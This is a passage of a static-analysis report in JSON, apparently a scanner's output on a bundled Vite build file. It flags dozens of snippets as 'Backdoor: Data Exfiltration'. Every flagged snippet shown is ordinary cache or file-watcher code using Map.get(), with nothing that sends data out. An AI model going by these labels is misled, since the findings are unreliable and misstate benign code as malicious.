                      "text": "      const base = path$n.posix.basename(normalizedFile);\n      for (const ext of extensions) {\n        const fileName = base + ext;\n        const fileDirentCache = direntCache.dirents.get(fileName);\n        if (fileDirentCache) {\n          const filePath = dirPath + \"/\" + fileName;\n          ensureFileMaybeSymlinkIsResolved(fileDirentCache, filePath);\n",
                      "markdown": "`      const base = path$n.posix.basename(normalizedFile);\n      for (const ext of extensions) {\n        const fileName = base + ext;\n        const fileDirentCache = direntCache.dirents.get(fileName);\n        if (fileDirentCache) {\n          const filePath = dirPath + \"/\" + fileName;\n          ensureFileMaybeSymlinkIsResolved(fileDirentCache, filePath);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45605,
                  "startColumn": 51,
                  "endLine": 45605,
                  "endColumn": 56,
                  "snippet": {
                    "text": "          }\n          direntCache.dirents = dirents;\n        }\n        const nextDirentCache = direntCache.dirents.get(parts[i]);\n        if (!nextDirentCache) {\n          return;\n        }\n",
                    "rendered": {
                      "text": "          }\n          direntCache.dirents = dirents;\n        }\n        const nextDirentCache = direntCache.dirents.get(parts[i]);\n        if (!nextDirentCache) {\n          return;\n        }\n",
                      "markdown": "`          }\n          direntCache.dirents = dirents;\n        }\n        const nextDirentCache = direntCache.dirents.get(parts[i]);\n        if (!nextDirentCache) {\n          return;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45545,
                  "startColumn": 32,
                  "endLine": 45545,
                  "endColumn": 37,
                  "snippet": {
                    "text": "};\nconst cachedFsUtilsMap = /* @__PURE__ */ new WeakMap();\nfunction getFsUtils(config) {\n  let fsUtils = cachedFsUtilsMap.get(config);\n  if (!fsUtils) {\n    if (config.command !== \"serve\" || config.server.fs.cachedChecks !== true || config.server.watch?.ignored || process.versions.pnp) {\n      fsUtils = commonFsUtils;\n",
                    "rendered": {
                      "text": "};\nconst cachedFsUtilsMap = /* @__PURE__ */ new WeakMap();\nfunction getFsUtils(config) {\n  let fsUtils = cachedFsUtilsMap.get(config);\n  if (!fsUtils) {\n    if (config.command !== \"serve\" || config.server.fs.cachedChecks !== true || config.server.watch?.ignored || process.versions.pnp) {\n      fsUtils = commonFsUtils;\n",
                      "markdown": "`};\nconst cachedFsUtilsMap = /* @__PURE__ */ new WeakMap();\nfunction getFsUtils(config) {\n  let fsUtils = cachedFsUtilsMap.get(config);\n  if (!fsUtils) {\n    if (config.command !== \"serve\" || config.server.fs.cachedChecks !== true || config.server.watch?.ignored || process.versions.pnp) {\n      fsUtils = commonFsUtils;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44687,
                  "startColumn": 26,
                  "endLine": 44687,
                  "endColumn": 31,
                  "snippet": {
                    "text": " */\n_addPathCloser(path, closer) {\n  if (!closer) return;\n  let list = this._closers.get(path);\n  if (!list) {\n    list = [];\n    this._closers.set(path, list);\n",
                    "rendered": {
                      "text": " */\n_addPathCloser(path, closer) {\n  if (!closer) return;\n  let list = this._closers.get(path);\n  if (!list) {\n    list = [];\n    this._closers.set(path, list);\n",
                      "markdown": "` */\n_addPathCloser(path, closer) {\n  if (!closer) return;\n  let list = this._closers.get(path);\n  if (!list) {\n    list = [];\n    this._closers.set(path, list);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44674,
                  "startColumn": 31,
                  "endLine": 44674,
                  "endColumn": 36,
                  "snippet": {
                    "text": " * @param {Path} path\n */\n_closeFile(path) {\n  const closers = this._closers.get(path);\n  if (!closers) return;\n  closers.forEach(closer => closer());\n  this._closers.delete(path);\n",
                    "rendered": {
                      "text": " * @param {Path} path\n */\n_closeFile(path) {\n  const closers = this._closers.get(path);\n  if (!closers) return;\n  closers.forEach(closer => closer());\n  this._closers.delete(path);\n",
                      "markdown": "` * @param {Path} path\n */\n_closeFile(path) {\n  const closers = this._closers.get(path);\n  if (!closers) return;\n  closers.forEach(closer => closer());\n  this._closers.delete(path);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44642,
                  "startColumn": 37,
                  "endLine": 44642,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  let relPath = path;\n  if (this.options.cwd) relPath = sysPath.relative(this.options.cwd, path);\n  if (this.options.awaitWriteFinish && this._pendingWrites.has(relPath)) {\n    const event = this._pendingWrites.get(relPath).cancelWait();\n    if (event === EV_ADD) return;\n  }\n\n",
                    "rendered": {
                      "text": "  let relPath = path;\n  if (this.options.cwd) relPath = sysPath.relative(this.options.cwd, path);\n  if (this.options.awaitWriteFinish && this._pendingWrites.has(relPath)) {\n    const event = this._pendingWrites.get(relPath).cancelWait();\n    if (event === EV_ADD) return;\n  }\n\n",
                      "markdown": "`  let relPath = path;\n  if (this.options.cwd) relPath = sysPath.relative(this.options.cwd, path);\n  if (this.options.awaitWriteFinish && this._pendingWrites.has(relPath)) {\n    const event = this._pendingWrites.get(relPath).cancelWait();\n    if (event === EV_ADD) return;\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44567,
                  "startColumn": 22,
                  "endLine": 44567,
                  "endColumn": 27,
                  "snippet": {
                    "text": "  if (!this._boundRemove) this._boundRemove = this._remove.bind(this);\n  const dir = sysPath.resolve(directory);\n  if (!this._watched.has(dir)) this._watched.set(dir, new DirEntry(dir, this._boundRemove));\n  return this._watched.get(dir);\n}\n\n// File helpers\n",
                    "rendered": {
                      "text": "  if (!this._boundRemove) this._boundRemove = this._remove.bind(this);\n  const dir = sysPath.resolve(directory);\n  if (!this._watched.has(dir)) this._watched.set(dir, new DirEntry(dir, this._boundRemove));\n  return this._watched.get(dir);\n}\n\n// File helpers\n",
                      "markdown": "`  if (!this._boundRemove) this._boundRemove = this._remove.bind(this);\n  const dir = sysPath.resolve(directory);\n  if (!this._watched.has(dir)) this._watched.set(dir, new DirEntry(dir, this._boundRemove));\n  return this._watched.get(dir);\n}\n\n// File helpers\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44479,
                  "startColumn": 36,
                  "endLine": 44479,
                  "endColumn": 41,
                  "snippet": {
                    "text": "      if (prevStat && curStat.size !== prevStat.size) {\n        this._pendingWrites.get(path).lastChange = now;\n      }\n      const pw = this._pendingWrites.get(path);\n      const df = now - pw.lastChange;\n\n      if (df >= threshold) {\n",
                    "rendered": {
                      "text": "      if (prevStat && curStat.size !== prevStat.size) {\n        this._pendingWrites.get(path).lastChange = now;\n      }\n      const pw = this._pendingWrites.get(path);\n      const df = now - pw.lastChange;\n\n      if (df >= threshold) {\n",
                      "markdown": "`      if (prevStat && curStat.size !== prevStat.size) {\n        this._pendingWrites.get(path).lastChange = now;\n      }\n      const pw = this._pendingWrites.get(path);\n      const df = now - pw.lastChange;\n\n      if (df >= threshold) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44477,
                  "startColumn": 27,
                  "endLine": 44477,
                  "endColumn": 32,
                  "snippet": {
                    "text": "      const now = Number(new Date());\n\n      if (prevStat && curStat.size !== prevStat.size) {\n        this._pendingWrites.get(path).lastChange = now;\n      }\n      const pw = this._pendingWrites.get(path);\n      const df = now - pw.lastChange;\n",
                    "rendered": {
                      "text": "      const now = Number(new Date());\n\n      if (prevStat && curStat.size !== prevStat.size) {\n        this._pendingWrites.get(path).lastChange = now;\n      }\n      const pw = this._pendingWrites.get(path);\n      const df = now - pw.lastChange;\n",
                      "markdown": "`      const now = Number(new Date());\n\n      if (prevStat && curStat.size !== prevStat.size) {\n        this._pendingWrites.get(path).lastChange = now;\n      }\n      const pw = this._pendingWrites.get(path);\n      const df = now - pw.lastChange;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44432,
                  "startColumn": 23,
                  "endLine": 44432,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n  let timeoutObject;\n  const clear = () => {\n    const item = action.get(path);\n    const count = item ? item.count : 0;\n    action.delete(path);\n    clearTimeout(timeoutObject);\n",
                    "rendered": {
                      "text": "\n  let timeoutObject;\n  const clear = () => {\n    const item = action.get(path);\n    const count = item ? item.count : 0;\n    action.delete(path);\n    clearTimeout(timeoutObject);\n",
                      "markdown": "`\n  let timeoutObject;\n  const clear = () => {\n    const item = action.get(path);\n    const count = item ? item.count : 0;\n    action.delete(path);\n    clearTimeout(timeoutObject);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44423,
                  "startColumn": 27,
                  "endLine": 44423,
                  "endColumn": 32,
                  "snippet": {
                    "text": "  /** @type {Map<Path, Object>} */\n  const action = this._throttled.get(actionType);\n  /** @type {Object} */\n  const actionPath = action.get(path);\n\n  if (actionPath) {\n    actionPath.count++;\n",
                    "rendered": {
                      "text": "  /** @type {Map<Path, Object>} */\n  const action = this._throttled.get(actionType);\n  /** @type {Object} */\n  const actionPath = action.get(path);\n\n  if (actionPath) {\n    actionPath.count++;\n",
                      "markdown": "`  /** @type {Map<Path, Object>} */\n  const action = this._throttled.get(actionType);\n  /** @type {Object} */\n  const actionPath = action.get(path);\n\n  if (actionPath) {\n    actionPath.count++;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44421,
                  "startColumn": 32,
                  "endLine": 44421,
                  "endColumn": 37,
                  "snippet": {
                    "text": "  }\n\n  /** @type {Map<Path, Object>} */\n  const action = this._throttled.get(actionType);\n  /** @type {Object} */\n  const actionPath = action.get(path);\n\n",
                    "rendered": {
                      "text": "  }\n\n  /** @type {Map<Path, Object>} */\n  const action = this._throttled.get(actionType);\n  /** @type {Object} */\n  const actionPath = action.get(path);\n\n",
                      "markdown": "`  }\n\n  /** @type {Map<Path, Object>} */\n  const action = this._throttled.get(actionType);\n  /** @type {Object} */\n  const actionPath = action.get(path);\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44327,
                  "startColumn": 38,
                  "endLine": 44327,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n  const awf = opts.awaitWriteFinish;\n  let pw;\n  if (awf && (pw = this._pendingWrites.get(path))) {\n    pw.lastChange = new Date();\n    return this;\n  }\n",
                    "rendered": {
                      "text": "\n  const awf = opts.awaitWriteFinish;\n  let pw;\n  if (awf && (pw = this._pendingWrites.get(path))) {\n    pw.lastChange = new Date();\n    return this;\n  }\n",
                      "markdown": "`\n  const awf = opts.awaitWriteFinish;\n  let pw;\n  if (awf && (pw = this._pendingWrites.get(path))) {\n    pw.lastChange = new Date();\n    return this;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 43366,
                  "startColumn": 29,
                  "endLine": 43366,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  for (const watchedPath of FSEventsWatchers.keys()) {\n    if (realPath.indexOf(sysPath$1.resolve(watchedPath) + sysPath$1.sep) === 0) {\n      watchPath = watchedPath;\n      cont = FSEventsWatchers.get(watchPath);\n      watchedParent = true;\n      break;\n    }\n",
                    "rendered": {
                      "text": "  for (const watchedPath of FSEventsWatchers.keys()) {\n    if (realPath.indexOf(sysPath$1.resolve(watchedPath) + sysPath$1.sep) === 0) {\n      watchPath = watchedPath;\n      cont = FSEventsWatchers.get(watchPath);\n      watchedParent = true;\n      break;\n    }\n",
                      "markdown": "`  for (const watchedPath of FSEventsWatchers.keys()) {\n    if (realPath.indexOf(sysPath$1.resolve(watchedPath) + sysPath$1.sep) === 0) {\n      watchPath = watchedPath;\n      cont = FSEventsWatchers.get(watchPath);\n      watchedParent = true;\n      break;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 43339,
                  "startColumn": 29,
                  "endLine": 43339,
                  "endColumn": 34,
                  "snippet": {
                    "text": "  let watchPath = sysPath$1.extname(realPath) ? sysPath$1.dirname(realPath) : realPath;\n\n  const parentPath = sysPath$1.dirname(watchPath);\n  let cont = FSEventsWatchers.get(watchPath);\n\n  // If we've accumulated a substantial number of paths that\n  // could have been consolidated by watching one directory\n",
                    "rendered": {
                      "text": "  let watchPath = sysPath$1.extname(realPath) ? sysPath$1.dirname(realPath) : realPath;\n\n  const parentPath = sysPath$1.dirname(watchPath);\n  let cont = FSEventsWatchers.get(watchPath);\n\n  // If we've accumulated a substantial number of paths that\n  // could have been consolidated by watching one directory\n",
                      "markdown": "`  let watchPath = sysPath$1.extname(realPath) ? sysPath$1.dirname(realPath) : realPath;\n\n  const parentPath = sysPath$1.dirname(watchPath);\n  let cont = FSEventsWatchers.get(watchPath);\n\n  // If we've accumulated a substantial number of paths that\n  // could have been consolidated by watching one directory\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 43008,
                  "startColumn": 32,
                  "endLine": 43008,
                  "endColumn": 37,
                  "snippet": {
                    "text": "\n    if (this.fsw.closed) return;\n    if (dir.has(item)) {\n      if (this.fsw._symlinkPaths.get(full) !== linkPath) {\n        this.fsw._symlinkPaths.set(full, linkPath);\n        this.fsw._emit(EV_CHANGE$2, path, entry.stats);\n      }\n",
                    "rendered": {
                      "text": "\n    if (this.fsw.closed) return;\n    if (dir.has(item)) {\n      if (this.fsw._symlinkPaths.get(full) !== linkPath) {\n        this.fsw._symlinkPaths.set(full, linkPath);\n        this.fsw._emit(EV_CHANGE$2, path, entry.stats);\n      }\n",
                      "markdown": "`\n    if (this.fsw.closed) return;\n    if (dir.has(item)) {\n      if (this.fsw._symlinkPaths.get(full) !== linkPath) {\n        this.fsw._symlinkPaths.set(full, linkPath);\n        this.fsw._emit(EV_CHANGE$2, path, entry.stats);\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42817,
                  "startColumn": 33,
                  "endLine": 42817,
                  "endColumn": 38,
                  "snippet": {
                    "text": " */\nconst setFsWatchFileListener = (path, fullPath, options, handlers) => {\n  const {listener, rawEmitter} = handlers;\n  let cont = FsWatchFileInstances.get(fullPath);\n\n  const copts = cont && cont.options;\n  if (copts && (copts.persistent < options.persistent || copts.interval > options.interval)) {\n",
                    "rendered": {
                      "text": " */\nconst setFsWatchFileListener = (path, fullPath, options, handlers) => {\n  const {listener, rawEmitter} = handlers;\n  let cont = FsWatchFileInstances.get(fullPath);\n\n  const copts = cont && cont.options;\n  if (copts && (copts.persistent < options.persistent || copts.interval > options.interval)) {\n",
                      "markdown": "` */\nconst setFsWatchFileListener = (path, fullPath, options, handlers) => {\n  const {listener, rawEmitter} = handlers;\n  let cont = FsWatchFileInstances.get(fullPath);\n\n  const copts = cont && cont.options;\n  if (copts && (copts.persistent < options.persistent || copts.interval > options.interval)) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42734,
                  "startColumn": 29,
                  "endLine": 42734,
                  "endColumn": 34,
                  "snippet": {
                    "text": " */\nconst setFsWatchListener = (path, fullPath, options, handlers) => {\n  const {listener, errHandler, rawEmitter} = handlers;\n  let cont = FsWatchInstances.get(fullPath);\n\n  /** @type {fs.FSWatcher=} */\n  let watcher;\n",
                    "rendered": {
                      "text": " */\nconst setFsWatchListener = (path, fullPath, options, handlers) => {\n  const {listener, errHandler, rawEmitter} = handlers;\n  let cont = FsWatchInstances.get(fullPath);\n\n  /** @type {fs.FSWatcher=} */\n  let watcher;\n",
                      "markdown": "` */\nconst setFsWatchListener = (path, fullPath, options, handlers) => {\n  const {listener, errHandler, rawEmitter} = handlers;\n  let cont = FsWatchInstances.get(fullPath);\n\n  /** @type {fs.FSWatcher=} */\n  let watcher;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 42717,
                  "startColumn": 31,
                  "endLine": 42717,
                  "endColumn": 36,
                  "snippet": {
                    "text": " * @param {*=} val3\n */\nconst fsWatchBroadcast = (fullPath, type, val1, val2, val3) => {\n  const cont = FsWatchInstances.get(fullPath);\n  if (!cont) return;\n  foreach(cont[type], (listener) => {\n    listener(val1, val2, val3);\n",
                    "rendered": {
                      "text": " * @param {*=} val3\n */\nconst fsWatchBroadcast = (fullPath, type, val1, val2, val3) => {\n  const cont = FsWatchInstances.get(fullPath);\n  if (!cont) return;\n  foreach(cont[type], (listener) => {\n    listener(val1, val2, val3);\n",
                      "markdown": "` * @param {*=} val3\n */\nconst fsWatchBroadcast = (fullPath, type, val1, val2, val3) => {\n  const cont = FsWatchInstances.get(fullPath);\n  if (!cont) return;\n  foreach(cont[type], (listener) => {\n    listener(val1, val2, val3);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 38514,
                  "startColumn": 26,
                  "endLine": 38514,
                  "endColumn": 31,
                  "snippet": {
                    "text": " * @returns {string}\n */\nfunction getMessage(key, parameters, self) {\n  const message = messages.get(key);\n  assert$1(message !== undefined, 'expected `message` to be found');\n\n  if (typeof message === 'function') {\n",
                    "rendered": {
                      "text": " * @returns {string}\n */\nfunction getMessage(key, parameters, self) {\n  const message = messages.get(key);\n  assert$1(message !== undefined, 'expected `message` to be found');\n\n  if (typeof message === 'function') {\n",
                      "markdown": "` * @returns {string}\n */\nfunction getMessage(key, parameters, self) {\n  const message = messages.get(key);\n  assert$1(message !== undefined, 'expected `message` to be found');\n\n  if (typeof message === 'function') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 37997,
                  "startColumn": 36,
                  "endLine": 37997,
                  "endColumn": 41,
                  "snippet": {
                    "text": "const convertTargetsCache = /* @__PURE__ */ new Map();\nconst convertTargets = (esbuildTarget) => {\n  if (!esbuildTarget) return {};\n  const cached = convertTargetsCache.get(esbuildTarget);\n  if (cached) return cached;\n  const targets = {};\n  const entriesWithoutES = arraify(esbuildTarget).flatMap((e) => {\n",
                    "rendered": {
                      "text": "const convertTargetsCache = /* @__PURE__ */ new Map();\nconst convertTargets = (esbuildTarget) => {\n  if (!esbuildTarget) return {};\n  const cached = convertTargetsCache.get(esbuildTarget);\n  if (cached) return cached;\n  const targets = {};\n  const entriesWithoutES = arraify(esbuildTarget).flatMap((e) => {\n",
                      "markdown": "`const convertTargetsCache = /* @__PURE__ */ new Map();\nconst convertTargets = (esbuildTarget) => {\n  if (!esbuildTarget) return {};\n  const cached = convertTargetsCache.get(esbuildTarget);\n  if (cached) return cached;\n  const targets = {};\n  const entriesWithoutES = arraify(esbuildTarget).flatMap((e) => {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 37765,
                  "startColumn": 30,
                  "endLine": 37765,
                  "endColumn": 35,
                  "snippet": {
                    "text": "      if (!workerMap.has(options.alias)) {\n        workerMap.set(options.alias, makeStylWorker(maxWorkers));\n      }\n      const worker = workerMap.get(options.alias);\n      const { content, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n",
                    "rendered": {
                      "text": "      if (!workerMap.has(options.alias)) {\n        workerMap.set(options.alias, makeStylWorker(maxWorkers));\n      }\n      const worker = workerMap.get(options.alias);\n      const { content, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n",
                      "markdown": "`      if (!workerMap.has(options.alias)) {\n        workerMap.set(options.alias, makeStylWorker(maxWorkers));\n      }\n      const worker = workerMap.get(options.alias);\n      const { content, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 37674,
                  "startColumn": 30,
                  "endLine": 37674,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          makeLessWorker(resolvers, options.alias, maxWorkers)\n        );\n      }\n      const worker = workerMap.get(options.alias);\n      const { content, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n",
                    "rendered": {
                      "text": "          makeLessWorker(resolvers, options.alias, maxWorkers)\n        );\n      }\n      const worker = workerMap.get(options.alias);\n      const { content, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n",
                      "markdown": "`          makeLessWorker(resolvers, options.alias, maxWorkers)\n        );\n      }\n      const worker = workerMap.get(options.alias);\n      const { content, map: additionalMap } = await getSource(\n        source,\n        options.filename,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
